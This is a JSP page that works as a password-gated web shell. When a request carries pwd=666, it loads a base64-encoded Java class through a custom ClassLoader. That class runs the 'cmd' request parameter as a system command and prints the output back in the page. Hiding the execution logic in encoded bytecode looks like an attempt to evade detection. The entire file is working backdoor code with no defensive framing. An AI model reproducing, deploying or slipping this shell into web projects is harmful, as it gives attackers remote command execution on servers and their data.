<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %><%--
  Created by IntelliJ IDEA.
  User: 59302
  Date: 2022/12/12
  Time: 18:08
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    if ("666".equals(request.getParameter("pwd"))) {
        String cmd = request.getParameter("cmd");
        ClassLoader classLoader = new ClassLoader() {
            @Override
            protected Class<?> findClass(String name) throws ClassNotFoundException {
                try {
                    BASE64Decoder decoder = new BASE64Decoder();
                    byte[] bytes = decoder.decodeBuffer("yv66vgAAADQAUAoAEQAuBwAvCgACAC4KADAAMQoAMAAyBwAzBwA0CgA1ADYKAAcANwoABgA4CgAGADkKAAIAOggAOwoAAgA8CQAQAD0HAD4HAD8BAAdjb21tYW5kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABdMcGFzcy9sb2FkZXIvRXZhbENsYXNzOwEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABXByaW50AQANU3RhY2tNYXBUYWJsZQcAPgcAQAcALwcAQQcAMwEACkV4Y2VwdGlvbnMHAEIBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEADkV2YWxDbGFzcy5qYXZhDAAUAEMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcARAwARQBGDABHAEgBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAQQwASQBKDAAUAEsMABQATAwATQArDABOAE8BAAEKDAAqACsMABIAEwEAFXBhc3MvbG9hZGVyL0V2YWxDbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAEAEgATAAAAAgABABQAFQACABYAAADnAAUABgAAAEsqtwABuwACWbcAA024AAQrtgAFTrsABlm7AAdZLbYACLcACbcACjoEGQS2AAtZOgXGABIsGQW2AAwSDbYADFen/+kqLLYADrUAD7EAAAADABcAAAAiAAgAAAAKAAQACwAMAAwAFAANACgADwAzABAAQgASAEoAEwAYAAAAPgAGAAAASwAZABoAAAAAAEsAEgATAAEADAA/ABsAHAACABQANwAdAB4AAwAoACMAHwAgAAQAMAAbACEAEwAFACIAAAAeAAL/ACgABQcAIwcAJAcAJQcAJgcAJwAA/AAZBwAkACgAAAAEAAEAKQABACoAKwABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABcAGAAAAAwAAQAAAAUAGQAaAAAAAQAsAAAAAgAt");
                    return defineClass(name, bytes, 0, bytes.length);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return super.findClass(name);
            }

            @Override
            public Class<?> loadClass(String name) throws ClassNotFoundException {
                if (name.contains("EvalClass")) {
                    return findClass(name);
                } else {
                    return super.loadClass(name);
                }
            }

        };
        Class<?> evalClass = classLoader.loadClass("pass.loader.EvalClass");
        Constructor cos = evalClass.getConstructor(String.class);
        Object obj = cos.newInstance(cmd);
        out.print("<pre>");
        out.print(obj.toString());
        out.print("</pre>");

    }
%>
